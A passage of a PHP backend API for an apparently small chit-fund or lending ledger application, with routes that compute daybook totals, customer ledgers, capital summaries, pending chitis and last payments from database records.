				if ($creditors["customers"][$g]["ccommlist"] && sizeof($creditors["customers"][$g]["ccommlist"])) {
					$creditors["customers"][$g]["disp"]["ccomm"] = 1;
				}
			}



		} //end for of customers
	}


	if ($debitors["customers"] && sizeof($debitors["customers"])) {
		for ($q = 0; $q < sizeof($debitors["customers"]); $q++) {
			//interestpaid
			$debitors["customers"][$q]["disp"]["interest"] = 0;
			$debitors["customers"][$q]["interestlist"] = array();
			$debitors["customers"][$q]["total"] = 0;

			if ($interestList && sizeof($interestList)) {
				for ($h = 0; $h < sizeof($interestList); $h++) {
					if ($interestList[$h]["customer"] == $debitors["customers"][$q]["id"]) {
						$tmppmtrans = sortPmtrans($interestList[$h], $pmtransList);
						$interestList[$h]['pmtrans'] = $tmppmtrans[0];
						$pmtransList = $tmppmtrans[1];
						array_push($debitors["customers"][$q]["interestlist"], $interestList[$h]);
						$debitors["customers"][$q]["total"] += $interestList[$h]["debit"];
					}
				}
				if ($debitors["customers"][$q]["interestlist"] && sizeof($debitors["customers"][$q]["interestlist"])) {
					$debitors["customers"][$q]["disp"]["interest"] = 1;
				}
			}

			//newchiti
			$debitors["customers"][$q]["disp"]["chiti"] = 0;
			$debitors["customers"][$q]["chitilist"] = array();
			if ($chitiList && sizeof($chitiList)) {
				for ($h = 0; $h < sizeof($chitiList); $h++) {
					if ($chitiList[$h]["customer"] == $debitors["customers"][$q]["id"]) {
						$tmppmtrans = sortPmtrans($chitiList[$h], $pmtransList);
						$chitiList[$h]['pmtrans'] = $tmppmtrans[0];
						$pmtransList = $tmppmtrans[1];
						array_push($debitors["customers"][$q]["chitilist"], $chitiList[$h]);
						$debitors["customers"][$q]["total"] += $chitiList[$h]["amount"];
					}
				}
				if ($debitors["customers"][$q]["chitilist"] && sizeof($debitors["customers"][$q]["chitilist"])) {
					$debitors["customers"][$q]["disp"]["chiti"] = 1;
				}
			}

			//drcrList
			$debitors["customers"][$q]["disp"]["drcr"] = 0;
			$debitors["customers"][$q]["drcrlist"] = array();
			if ($drcrList && sizeof($drcrList)) {
				for ($d = 0; $d < sizeof($drcrList); $d++) {
					if ($drcrList[$d]["debit"] > 0 && $drcrList[$d]["customer"] == $debitors["customers"][$q]["id"]) {
						$tmppmtrans = sortPmtrans($drcrList[$d], $pmtransList);
						$drcrList[$d]['pmtrans'] = $tmppmtrans[0];
						$pmtransList = $tmppmtrans[1];
						array_push($debitors["customers"][$q]["drcrlist"], $drcrList[$d]);
						$debitors["customers"][$q]["total"] += $drcrList[$d]["debit"];
					}
				}
				if ($debitors["customers"][$q]["drcrlist"] && sizeof($debitors["customers"][$q]["drcrlist"])) {
					$debitors["customers"][$q]["disp"]["drcr"] = 1;
				}
			}


			//cftransList
			$debitors["customers"][$q]["disp"]["cftrans"] = 0;
			$debitors["customers"][$q]["cftranslist"] = array();
			if ($cftransList && sizeof($cftransList)) {
				for ($d = 0; $d < sizeof($cftransList); $d++) {
					if ($cftransList[$d]["debit"] > 0 && $cftransList[$d]["maincus"] == $debitors["customers"][$q]["id"]) {
						// echo "cusid-->".json_encode($debitors["customers"][$q]["id"]);
						$tmppmtrans = sortPmtrans($cftransList[$d], $pmtransList);
						$cftransList[$d]['pmtrans'] = $tmppmtrans[0];
						$pmtransList = $tmppmtrans[1];
						array_push($debitors["customers"][$q]["cftranslist"], $cftransList[$d]);
						// echo json_encode($debitors["customers"][$q]["cftranslist"]);
						$debitors["customers"][$q]["disp"]["cftrans"] = 1;
						$debitors["customers"][$q]["total"] += $cftransList[$d]["debit"];

					}
				}
			}

		} //drcustomers
	}



	// $creditors["rcvdamtlist"] = array();
	// echo json_encode($creditors) ;
	// echo json_encode($debitors["customers"]) ;
	// echo "--->".$creditors["total"];
	// echo  "--->".$opbal["main"]["amt"];
	// $crcustomerids = array_merge($crcustomerids);
	// echo json_encode($crcustomerids);
	// $params = $db->getFunctionParam("collection");
	// $getdata = array();
	// for($i=0;$i<sizeof($params);$i++){

	// 	if(getParams($app->request->get($params[$i]))|| (gettype($app->request->get($params[$i]))=="string" && $app->request->get($params[$i])== "0")){
	// 		// echo $i; echo "->"; echo getParams($app->request->get($params[$i]));
	// 		array_push($getdata,getParams($app->request->get($params[$i])));
	// 	}else{
	// 		array_push($getdata,"");
	// 	}
	// }	

	// $collectionList = call_user_func_array(array($db,'getcollection'),$getdata);
	// $collection= array();

	// $outputfields = array("id","chiti","code","tYpe","status","chitiamount","date","amount","notes","sowji","sowjitotal","suri","fullandevi","iscountable","received","reverseid","receivedfrom","customer","customerFL","hami","haminame","rcvddate","created","updated");
	// $qryfields = array("id","chiti","code","tYpe","status","chitiamount","date","amount","notes","sowji","sowjitotal","suri","fullandevi","iscountable","received","reverseid","receivedfrom","customer","customerFL","hami","haminame","rcvddate","created","updated");
	// for($i=0;$i<sizeof($collectionList);$i++){
	// 	$tmp = array();
	// 	for($j=0;$j<sizeof($qryfields);$j++){
	// 		if(isset($collectionList[$i][$outputfields[$j]])){
	// 			$tmp[$qryfields[$j]] = $collectionList[$i][$qryfields[$j]];
	// 		}
	// 	}
	// 	array_push($collection,$tmp);
	// }

	// $opbalarr = array();
	// $opbalarr = $opbal;
	// $opbalarr["cashopbal"] = $opbal;
	// $opbalarr["sowjiopbal"] = $opbal;

	for ($f = 1; $f < sizeof($closingbal); $f++) {
		$closingbal[0]["amt"] += $closingbal[$f]["amt"];
	}

	$transttl = array();
	for ($g = 0; $g < sizeof($closingbal); $g++) {
		$transtmp = array();
		$transtmp["name"] = $closingbal[$g]["name"];
		$transtmp["id"] = $closingbal[$g]["id"];
		for ($h = 0; $h < sizeof($opbal); $h++) {
			if ($closingbal[$g]["id"] == $opbal[$h]["id"]) {
				$transtmp["amt"] = $closingbal[$g]["amt"] - $opbal[$h]["amt"];
				break;
			}
		}
		array_push($transttl, $transtmp);
	}




	$daybook["creditors"] = $creditors;
	$daybook["debitors"] = $debitors;
	$daybook["opbal"] = $opbal;
	$daybook["transttl"] = $transttl;
	$daybook["closingbal"] = $closingbal;

	$response["error"] = "false";
	$response["status"] = "success";
	$response["daybook"] = $daybook;
	$response["message"] = "Woot ! successfully retreived the Daybook Details";
	echoRespnse(200, $response);

});


// http://localhost/applications/finance_demo/api/v1/showledger
// http://localhost/applications/finance_demo/api/v1/showledger

$app->get('/showledger', function () use ($app) {
	//this Api call is made only for Between Dates , no  single date is accepted
	$response = array();
	$db = new DbHandler();
	$date = $app->request->get("date");
	$customer = $app->request->get("customer");
	$forint = $app->request->get("forint");
	$pmids = "";
	$seperator = "";
	$opbal = 0.00;
	$closingbal = 0.00;
	$asaluBal = 0;
	$interestBal = 0;
	$fromdate =  json_decode($date, True);
	$fromdate =  $fromdate["value"];
	
	//start opbal calc
	$params = $db->getFunctionParam("drcr");
	$getdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		if ($params[$i] == "date") {
			$temp = array();
			$temp["op"] = "<";
			$temp["value"] = $fromdate;//"2021-01-01";
			array_push($getdata, json_encode($temp));
		} else if ($params[$i] == "forint") {
			array_push($getdata, $forint);
		} else if ($params[$i] == "customer") {
			array_push($getdata, $customer);
		} else if ($params[$i] == "fields") {
			array_push($getdata, "sum(credit) as credittotal,sum(debit) as debittotal");
		} else {
			array_push($getdata, "");
		}
	}
	// echo json_encode($getdata);
	$openingDrcrList = call_user_func_array(array($db, 'getdrcr'), $getdata);	
	
	if($openingDrcrList && sizeof($openingDrcrList) > 0){
		$opbal += (floatval($openingDrcrList[0]["credittotal"]))?sprintf("%.2f", $openingDrcrList[0]["credittotal"]):0 ;
		$opbal -= (floatval($openingDrcrList[0]["debittotal"]))?sprintf("%.2f", $openingDrcrList[0]["debittotal"]): 0 ;
		$asaluBal = sprintf("%.2f",$opbal);
	}
	
	// echo json_encode($openingDrcrList);
	// echo $opbal;

	$params = $db->getFunctionParam("interest");
	$getintdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		if ($params[$i] == "date") {
			$temp = array();
			$temp["op"] = "<";
			$temp["value"] = $fromdate;//"2021-01-01";
			array_push($getintdata, json_encode($temp));
		} else if ($params[$i] == "customer") {
			array_push($getintdata, $customer);
		} else if ($params[$i] == "fields") {
			array_push($getintdata, "sum(credit) as credittotal,sum(debit) as debittotal");
		} else {
			array_push($getintdata, "");
		}
	}

	$opinterestList = call_user_func_array(array($db, 'getInterest'), $getintdata);
	
	// echo json_encode($interestList);
	if($opinterestList && sizeof($opinterestList) > 0){
		$opbal += (floatval($opinterestList[0]["credittotal"]))?sprintf("%.2f", $opinterestList[0]["credittotal"]):0 ;
		$opbal -= (floatval($opinterestList[0]["debittotal"]))?sprintf("%.2f", $opinterestList[0]["debittotal"]): 0 ;
		$interestBal = $opbal - $asaluBal;
	}

	// echo "interest".$opbal."-->".$interestBal." = ".$asaluBal;;

	//end opbal


	$params = $db->getFunctionParam("drcr");
	$getdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		if ($params[$i] == "forint") {
			array_push($getdata, $forint);
		} else if ($params[$i] == "date") {
			array_push($getdata, $date);
		} else if ($params[$i] == "customer") {
			array_push($getdata, $customer);
		} else {
			array_push($getdata, "");
		}
	}

	$drcrList = call_user_func_array(array($db, 'getdrcr'), $getdata);
	// echo json_encode($drcrList);
	if($drcrList && sizeof($drcrList) > 0){
		for($k=0;$k<sizeof($drcrList);$k++){
			$drcrList[$k]["interestentry"] = 0;
			if($drcrList[$k]["paymentmode"] == 50 && $drcrList[$k]["pmid"]){
				// echo "pmids ".$pmids."seperator". $seperator . " ". $k." ". $drcrList[$k]["id"]. "pmid - " .$drcrList[$k]["pmid"]. " next ";
				$pmids .= $seperator . $drcrList[$k]['pmid'];
				$seperator = ",";
			}
		}
	}

	$getpmdata = array();
	$params = $db->getFunctionParam("pmtrans");
	for ($m = 0; $m < sizeof($params); $m++) {
		if ($params[$m] == "id") {
			$temp = array();
			$temp["op"] = "In";
			$temp["value"] = $pmids;
			array_push($getpmdata, json_encode($temp));
		} else if ($params[$m] == "tablename") {		
			array_push($getpmdata, "drcr");
		}else{
			array_push($getpmdata, "");
		}
	}

	$pmtransList = call_user_func_array(array($db, 'getPmTrans'), $getpmdata);
		if (sizeof($pmtransList)) {
			for ($m = 0; $m < sizeof($drcrList); $m++) {
				$drcrList[$m]["pmtrans"] = array();
				if ($drcrList[$m]["paymentmode"] == 50) {
					$tmppmtrans = sortPmtrans($drcrList[$m], $pmtransList);
					$drcrList[$m]["pmtrans"] = $tmppmtrans[0];
					$pmtransList = $tmppmtrans[1];
				}
			}
		}
	
	$params = $db->getFunctionParam("interest");
	$getintdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		if ($params[$i] == "date") {
			array_push($getintdata, $date);
		} else if ($params[$i] == "customer") {
			array_push($getintdata, $customer);
		} else {
			array_push($getintdata, "");
		}
	}

	$interestList = call_user_func_array(array($db, 'getInterest'), $getintdata);
	
	// echo json_encode($interestList);
	if($interestList && sizeof($interestList)){
		$pmids = "";
		$seperator = "";
		for($j=0;$j<sizeof($interestList);$j++){
			$tmp =  array(
				"id" =>  $interestList[$j]["id"],
				"date" =>  $interestList[$j]["date"],
				"customer" =>  $interestList[$j]["customer"],
				"customername" => $interestList[$j]["customername"],
				"debit" =>   $interestList[$j]["debit"],
				"credit" =>  $interestList[$j]["credit"],
				"collectedby"=> 0,
				"forint" =>  1,
				"creditexp" =>  0,
				"crid" =>  0,
				"chitfundid" =>  0,
				"showdaybook" =>  0,
				"note" =>  $interestList[$j]["note"],
				"paymentmode"=> $interestList[$j]["paymentmode"],
        		"pmid"=> $interestList[$j]["pmid"],
        		"pmtrans"=> array(),
				"paymentmodename"=> $interestList[$j]["paymentmodename"],
				"note1" =>  "",
				"interestentry" => 1
			);
			// $tmp["interestentry"] = 0;
			array_push($drcrList,$tmp);
			if($interestList[$j]["paymentmode"] == 50 && $interestList[$j]["pmid"]){
				$pmids .= $seperator . $interestList[$j]['pmid'];
				$seperator = ",";
			}
		}

		$getpmdata = array();	
		$params = $db->getFunctionParam("pmtrans");
		for ($m = 0; $m < sizeof($params); $m++) {
			if ($params[$m] == "id") {
				$temp = array();
				$temp["op"] = "In";
				$temp["value"] = $pmids;
				array_push($getpmdata, json_encode($temp));
			} else if ($params[$m] == "tablename") {		
				array_push($getpmdata, "interest");
			}else{
				array_push($getpmdata, "");
			}
		}

	$pmtransList = call_user_func_array(array($db, 'getPmTrans'), $getpmdata);
		if (sizeof($pmtransList)) {
			for ($h = 0; $h < sizeof($interestList); $h++) {
				$interestList[$h]["pmtrans"] = array();
				if ($interestList[$h]["paymentmode"] == 50) {
					$tmppmtrans = sortPmtrans($interestList[$h], $pmtransList);
					$interestList[$h]["pmtrans"] = $tmppmtrans[0];
					$pmtransList = $tmppmtrans[1];
				}
			}
		}
	}
		$response["opbal"] = sprintf("%.2f", $opbal);
		$response["closingbal"] =  sprintf("%.2f", $opbal);
		if($drcrList && sizeof($drcrList)>0){
			$drcrList = sortArrayByDate($drcrList,'asc');
			
			$drcrList = calculateBalance($drcrList,$opbal,$asaluBal,$interestBal);
			$response["closingbal"] =  sprintf("%.2f", $drcrList[sizeof($drcrList)-1]["balance"]);
		}
		
		if($drcrList && sizeof($drcrList)>0){
			
			$response['status'] = "success";
			$response["message"] = "Successfully fetched Entries of ". $drcrList[0]["customername"];
			$response["ledgerList"] = $drcrList;
			
		} else {
			$response['status'] = "success";
			$response["ledgerList"] = array();			
			$response["message"] = "No Entries Found For the given date";
			$response["code"] = "NOTEXIST";
		}
		
		echoRespnse(200, $response);
	// }





});


//show capitalsummary
$app->get('/capsummary', function () use ($app) {
	//this Api call is made only for Between Dates , no  single date is accepted
	$response = array();
	$db = new DbHandler();
	$date = $app->request->get("date");
	$rcvdint = 0;
	$rcvdccomm = 0;
	$exp = 0;

	$pmids = "";
	$seperator = "";
	$opbal = 0.00;
	$closingbal = 0.00;
	$asaluBal = 0;
	$interestBal = 0;
	$fromdate =  json_decode($date, True);
	$fromdate =  $fromdate["value"];
	
	

	$params = $db->getFunctionParam("drcr");
	$getdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		if ($params[$i] == "forint") {
			array_push($getdata, $forint);
		} else if ($params[$i] == "date") {
			array_push($getdata, $date);
		} else if ($params[$i] == "customer") {
			array_push($getdata, $customer);
		} else {
			array_push($getdata, "");
		}
	}

	$drcrList = call_user_func_array(array($db, 'getdrcr'), $getdata);
	// echo json_encode($drcrList);
	if($drcrList && sizeof($drcrList) > 0){
		for($k=0;$k<sizeof($drcrList);$k++){
			$drcrList[$k]["interestentry"] = 0;
			if($drcrList[$k]["paymentmode"] == 50 && $drcrList[$k]["pmid"]){
				// echo "pmids ".$pmids."seperator". $seperator . " ". $k." ". $drcrList[$k]["id"]. "pmid - " .$drcrList[$k]["pmid"]. " next ";
				$pmids .= $seperator . $drcrList[$k]['pmid'];
				$seperator = ",";
			}
		}
	}

	$getpmdata = array();
	$params = $db->getFunctionParam("pmtrans");
	for ($m = 0; $m < sizeof($params); $m++) {
		if ($params[$m] == "id") {
			$temp = array();
			$temp["op"] = "In";
			$temp["value"] = $pmids;
			array_push($getpmdata, json_encode($temp));
		} else if ($params[$m] == "tablename") {		
			array_push($getpmdata, "drcr");
		}else{
			array_push($getpmdata, "");
		}
	}

	$pmtransList = call_user_func_array(array($db, 'getPmTrans'), $getpmdata);
		if (sizeof($pmtransList)) {
			for ($m = 0; $m < sizeof($drcrList); $m++) {
				$drcrList[$m]["pmtrans"] = array();
				if ($drcrList[$m]["paymentmode"] == 50) {
					$tmppmtrans = sortPmtrans($drcrList[$m], $pmtransList);
					$drcrList[$m]["pmtrans"] = $tmppmtrans[0];
					$pmtransList = $tmppmtrans[1];
				}
			}
		}
	
	$params = $db->getFunctionParam("interest");
	$getintdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		if ($params[$i] == "date") {
			array_push($getintdata, $date);
		} else if ($params[$i] == "customer") {
			array_push($getintdata, $customer);
		} else {
			array_push($getintdata, "");
		}
	}

	$interestList = call_user_func_array(array($db, 'getInterest'), $getintdata);
	
	// echo json_encode($interestList);
	if($interestList && sizeof($interestList)){
		$pmids = "";
		$seperator = "";
		for($j=0;$j<sizeof($interestList);$j++){
			$tmp =  array(
				"id" =>  $interestList[$j]["id"],
				"date" =>  $interestList[$j]["date"],
				"customer" =>  $interestList[$j]["customer"],
				"customername" => $interestList[$j]["customername"],
				"debit" =>   $interestList[$j]["debit"],
				"credit" =>  $interestList[$j]["credit"],
				"collectedby"=> 0,
				"forint" =>  1,
				"creditexp" =>  0,
				"crid" =>  0,
				"chitfundid" =>  0,
				"showdaybook" =>  0,
				"note" =>  $interestList[$j]["note"],
				"paymentmode"=> $interestList[$j]["paymentmode"],
        		"pmid"=> $interestList[$j]["pmid"],
        		"pmtrans"=> array(),
				"paymentmodename"=> $interestList[$j]["paymentmodename"],
				"note1" =>  "",
				"interestentry" => 1
			);
			// $tmp["interestentry"] = 0;
			array_push($drcrList,$tmp);
			if($interestList[$j]["paymentmode"] == 50 && $interestList[$j]["pmid"]){
				$pmids .= $seperator . $interestList[$j]['pmid'];
				$seperator = ",";
			}
		}

		$getpmdata = array();	
		$params = $db->getFunctionParam("pmtrans");
		for ($m = 0; $m < sizeof($params); $m++) {
			if ($params[$m] == "id") {
				$temp = array();
				$temp["op"] = "In";
				$temp["value"] = $pmids;
				array_push($getpmdata, json_encode($temp));
			} else if ($params[$m] == "tablename") {		
				array_push($getpmdata, "interest");
			}else{
				array_push($getpmdata, "");
			}
		}

	$pmtransList = call_user_func_array(array($db, 'getPmTrans'), $getpmdata);
		if (sizeof($pmtransList)) {
			for ($h = 0; $h < sizeof($interestList); $h++) {
				$interestList[$h]["pmtrans"] = array();
				if ($interestList[$h]["paymentmode"] == 50) {
					$tmppmtrans = sortPmtrans($interestList[$h], $pmtransList);
					$interestList[$h]["pmtrans"] = $tmppmtrans[0];
					$pmtransList = $tmppmtrans[1];
				}
			}
		}
	}
		$response["opbal"] = sprintf("%.2f", $opbal);
		$response["closingbal"] =  sprintf("%.2f", $opbal);
		if($drcrList && sizeof($drcrList)>0){
			$drcrList = sortArrayByDate($drcrList,'asc');
			
			$drcrList = calculateBalance($drcrList,$opbal,$asaluBal,$interestBal);
			$response["closingbal"] =  sprintf("%.2f", $drcrList[sizeof($drcrList)-1]["balance"]);
		}
		
		if($drcrList && sizeof($drcrList)>0){
			
			$response['status'] = "success";
			$response["message"] = "Successfully fetched Entries of ". $drcrList[0]["customername"];
			$response["ledgerList"] = $drcrList;
			
		} else {
			$response['status'] = "success";
			$response["ledgerList"] = array();			
			$response["message"] = "No Entries Found For the given date";
			$response["code"] = "NOTEXIST";
		}
		
		echoRespnse(200, $response);
	// }





});

//end balance sheet

$app->get('/pendingchiti', function () use ($app) {
	$response = array();
	$db = new DbHandler();

	$params = $db->getFunctionParam("chiti");
	$getdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		if (getParams($app->request->get($params[$i]))) {
			array_push($getdata, getParams($app->request->get($params[$i])));
		} else {
			array_push($getdata, "");
		}
	}

	$pendingchitiList = call_user_func_array(array($db, 'getchiti'), $getdata);

	if ($pendingchitiList && sizeof($pendingchitiList) > 0) {
		$chitiids = array();
		for ($i = 0; $i < sizeof($pendingchitiList); $i++) {
			array_push($chitiids, $pendingchitiList[$i]["id"]);
		}


		//get asalu and calculate remaining asalu of pending chiti's
		$getdata = array();
		$params = $db->getFunctionParam("asalu");
		for ($i = 0; $i < sizeof($params); $i++) {
			if ($params[$i] == "chiti") {
				$tmp = array();
				$tmp["op"] = "In";
				$tmp["value"] = implode(',', $chitiids);
				array_push($getdata, json_encode($tmp));
			} else if ($params[$i] == "fields") {
				array_push($getdata, "sum(a.amount) as amount");
			} else if ($params[$i] == "group_by") {
				array_push($getdata, "a.chiti");
			} else {
				array_push($getdata, "");
			}
		}

		$asaluDetail = call_user_func_array(array($db, 'getasalu'), $getdata);


		$params = $db->getFunctionParam("collection");
		$getdata = array();
		for ($i = 0; $i < sizeof($params); $i++) {
			if ($params[$i] == "chiti") {
				$tmp = array();
				$tmp["op"] = "In";
				$tmp["value"] = implode(',', $chitiids);
				array_push($getdata, json_encode($tmp));
			} else if ($params[$i] == "received") {
				array_push($getdata, "0");
			} else if ($params[$i] == "fields") {
				array_push($getdata, "sum(a.amount) as amount,round(SUM(a.chiti)/a.chiti) as intpendingmonths,max(a.date) as date");
			} else if ($params[$i] == "group_by") {
				array_push($getdata, "a.chiti");
			} else {
				array_push($getdata, "");
			}
		}
		$collectionList = call_user_func_array(array($db, 'getcollection'), $getdata);

		if ($collectionList && sizeof($collectionList) > 0) {
			$ttlcolids = "";
			for ($t = 0; $t < sizeof($collectionList); $t++) {
				if (strlen($collectionList[$t]["colids"]) > 0) {
					if ($t == 0 || $ttlcolids == "") {
						$ttlcolids = $collectionList[$t]["colids"];
					} else {
						$ttlcolids .= "," . $collectionList[$t]["colids"];
					}
				}
			}
		}

		// echo "ttlids".$ttlcolids;

		$getrcvddata = array();
		$paramss = $db->getFunctionParam("receivedamount");
		for ($m = 0; $m < sizeof($paramss); $m++) {
			if ($paramss[$m] == "colid") {
				$tmp = array();
				$tmp["op"] = "In";
				$tmp["value"] = $ttlcolids;
				array_push($getrcvddata, json_encode($tmp));
			} else if ($paramss[$m] == "fields") {
				array_push($getrcvddata, "sum(a.amount) as amount");
			} else if ($paramss[$m] == "group_by") {
				array_push($getrcvddata, "a.chiti");
			} else {
				array_push($getrcvddata, "");
			}
		}

		$receivedDetail = call_user_func_array(array($db, 'getreceivedamount'), $getrcvddata);


		// echo "hi->>"; echo json_encode($receivedDetail);


		for ($i = 0; $i < sizeof($pendingchitiList); $i++) {
			//declaring new variable for pendingchitilist here
			$pendingchitiList[$i]["remainingasalu"] = $pendingchitiList[$i]["amount"];
			$pendingchitiList[$i]["remainingint"] = 0;
			$pendingchitiList[$i]["intpendingmonths"] = 0;
			$pendingchitiList[$i]["ttlintpendingmonths"] = 0;

			if ($asaluDetail && sizeof($asaluDetail) > 0) {
				for ($k = 0; $k < sizeof($asaluDetail); $k++) {
					// echo "k=>".$k;
					if ($pendingchitiList[$i]["id"] == $asaluDetail[$k]["chiti"]) {
						$pendingchitiList[$i]["remainingasalu"] -= $asaluDetail[$k]["amount"];
						break;
					}
				}
				// echo $pendingchitiList[$i]["amount"];echo "==";echo $pendingchitiList[$i]["remainingasalu"];echo "--->";
			}

			if ($collectionList && sizeof($collectionList) > 0) {
				for ($m = 0; $m < sizeof($collectionList); $m++) {
					if ($pendingchitiList[$i]["id"] == $collectionList[$m]["chiti"]) {
						$pendingchitiList[$i]["remainingint"] += $collectionList[$m]["amount"];

						//Get Date difference as total difference
						$d1 = strtotime($collectionList[$m]["date"] . " 00:00:00");
						$d2 = strtotime(date("Y/m/d") . " 00:00:00");
						$totalSecondsDiff = abs($d1 - $d2); //42600225
						$totalMonthsDiff = Round($totalSecondsDiff / 60 / 60 / 24 / 30); //16.43
						// $pendingchitiList[$i]["intpendingmonths"] = $totalMonthsDiff ."(".$collectionList[$m]["intpendingmonths"].")" . " = " . ($totalMonthsDiff + $collectionList[$m]["intpendingmonths"]);
						$pendingchitiList[$i]["intpendingmonths"] = $collectionList[$m]["intpendingmonths"];
						$pendingchitiList[$i]["ttlintpendingmonths"] = $totalMonthsDiff + $collectionList[$m]["intpendingmonths"];
						// $totalMinutesDiff = $totalSecondsDiff/60; //710003.75
						// $totalHoursDiff   = $totalSecondsDiff/60/60;//11833.39
						// $totalDaysDiff    = $totalSecondsDiff/60/60/24; //493.05
						// $totalMonthsDiff  = $totalSecondsDiff/60/60/24/30; //16.43
						// $totalYearsDiff   = $totalSecondsDiff/60/60/24/365; //1.35
						break;
					}
				}
			}

			if ($receivedDetail && sizeof($receivedDetail) > 0) {
				for ($n = 0; $n < sizeof($receivedDetail); $n++) {
					if ($pendingchitiList[$i]["id"] == $receivedDetail[$n]["chiti"]) {
						$pendingchitiList[$i]["remainingint"] -= $receivedDetail[$n]["amount"];
						break;
					}
				}
			}

		}



		$response['status'] = "success";
		$response["message"] = "Successfully fetched Pending Chiti's Data";
		$response["pendingchitilist"] = $pendingchitiList;
		echoRespnse(200, $response);

	} else {
		$response['status'] = "success";
		$response["message"] = "No Pending Chiti Found";
		$response["code"] = "NOTEXIST";
	}


});




$app->get('/lastpayment', function () use ($app) {
	$response = array();
	$db = new DbHandler();

	$t = strtotime("-200 days");
	$bfreday = date("Y-m-d", $t);
	// echo $bfreday;
	$paymentmodeList = $db->getdynamicRecord("select * FROM paymentmodes ", 100);
	$payments = $db->getdynamicRecord("SELECT a.chiti,DATEDIFF(NOW(),a.rcvddate) AS days, SUM(a.amount) as amount,a.pmid as pmid, a.rcvddate, a.customer, a.note, CONCAT(e.firstname,' ' ,e.lastname) as customername ,a.paymentmode,f.tYpe,g.firstname as haminame FROM `received` a INNER JOIN ( SELECT chiti, MAX(rcvddate) AS 'rcvddate' FROM received b LEFT join chiti c on b.chiti = c.id where b.note != 'deducted' and c.status = 1 and b.rcvddate >'" . $bfreday . "' and b.deleted = 0 and c.deleted = 0 GROUP BY b.chiti )d ON a.chiti = d.chiti AND a.rcvddate = d.rcvddate left JOIN customers e on a.customer = e.id left join chiti f on a.chiti = f.id left join customers g on e.hami=g.id WHERE a.deleted = 0 and e.deleted = 0 GROUP BY a.chiti ORDER BY `a`.`rcvddate` ASC ", 3000);
	// echo json_encode($payments);
	$pmids = "";
	$seperator = "";
	for ($m = 0; $m < sizeof($payments); $m++) {
		if ($payments[$m]['paymentmode'] == 50) {
			$pmids .= $seperator . $payments[$m]['pmid'];
			$seperator = ",";
		} else {
			$payments[$m]['paymentmodename'] = getpmname($payments[$m]['paymentmode'], $paymentmodeList);
		}
	}
	if (strlen($pmids) > 0) {
		$getpmdata = array();
		$params = $db->getFunctionParam("pmtrans");
		for ($m = 0; $m < sizeof($params); $m++) {
			if ($params[$m] == "id") {
				$temp = array();
				$temp["op"] = "In";
				$temp["value"] = $pmids;
				array_push($getpmdata, json_encode($temp));
			} else {
				array_push($getpmdata, "");
			}
		}
		// echo json_encode($getpmdata);
		$pmtransList = call_user_func_array(array($db, 'getPmTrans'), $getpmdata);
		if (sizeof($pmtransList)) {
			for ($m = 0; $m < sizeof($payments); $m++) {
				if ($payments[$m]["paymentmode"] == 50) {
					$tmppmtrans = sortPmtrans($payments[$m], $pmtransList);
					$payments[$m]['pmtrans'] = $tmppmtrans[0];
					$pmtransList = $tmppmtrans[1];
				}
			}
		}
	}

	$params = $db->getFunctionParam("chiti");
	$getdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		if ($params[$i] == 'date') {
			$tmp = array();
			$tmp["op"] = ">";
			$tmp["value"] = $bfreday;
			array_push($getdata, json_encode($tmp));
		} else if ($params[$i] == 'status') {
			array_push($getdata, 1);
		} else {
			array_push($getdata, "");
		}
	}
	$pendingchitiList = call_user_func_array(array($db, 'getchiti'), $getdata);

	for ($j = 0; $j < sizeof($pendingchitiList); $j++) {
		$exist = false;
		for ($k = 0; $k < sizeof($payments); $k++) {
			// echo json_encode($payments[$k]);
			// echo $pendingchitiList[$j]['id'];
			if ($pendingchitiList[$j]['id'] == $payments[$k]['chiti']) {
				$exist = true;
				break;
			}
		}
		if (!$exist) {
			$tmparr = array(
				"id" => $pendingchitiList[$j]['id'],
				"customer" => $pendingchitiList[$j]['customer'],
				"amount" => "0",
				"rcvddate" => $pendingchitiList[$j]['date'],
				"days" => strval((strtotime(date("Y-m-d")) - strtotime($pendingchitiList[$j]['date'])) / (60 * 60 * 24)),
				"asalu" => 0,
				"asaluid" => 0,
				"chiti" => strval($pendingchitiList[$j]['id']),
				"colid" => 0,
				"paymentmode" => 0,
				"pmid" => "",
				"note" => "not yet started",
				"created" => $pendingchitiList[$j]['created'],
				"updated" => $pendingchitiList[$j]['updated'],
				"deleted" => $pendingchitiList[$j]['deleted'],
				"customername" => $pendingchitiList[$j]['customername'],
				"latestdate" => $pendingchitiList[$j]['date'],
				"paymentmodename" => "",
			);
			array_push($payments, $tmparr);
		}
	}
	// usort($payments,"sortfunction");
	usort($payments, 'date_compare');

	// $payments = $db->getdynamicRecord("SELECT a.*,CONCAT(c.firstname,' ' ,c.lastname) as customername,MAX(rcvddate) as latestdate,d.modename as paymentmodename FROM `received` a INNER join `chiti` b on a.chiti = b.id left join customers c on a.customer = c.id left join paymentmodes d on a.paymentmode= d.id  WHERE b.status = 1  and b.tYpe = 5 and a.note != 'deducted' and a.note != 'Deducted'  and b.date >'".$bfreday . "' and a.deleted = 0 and b.deleted = 0  GROUP BY a.chiti ORDER BY `latestdate` ASC",3000);
	//https://github.com/flutter/flutter/issues/97873
	if ($payments && sizeof($payments) > 0) {

		$response['status'] = "success";
		$response["message"] = "Successfully fetched Last Payments";
		$response["lastpayments"] = $payments;
		echoRespnse(200, $response);

	} else {
		$response['status'] = "success";
		$response["message"] = "No Data Found";
		$response["code"] = "NOTEXIST";
		echoRespnse(204, $response);
	}


});


// $app->get('/lastpayment',function() use ($app){
// 	$response = array();
// 	$db =new DbHandler();

// 	$t = strtotime("-200 days");
// 	$bfreday = date("Y-m-d", $t);
// 	// echo $bfreday;

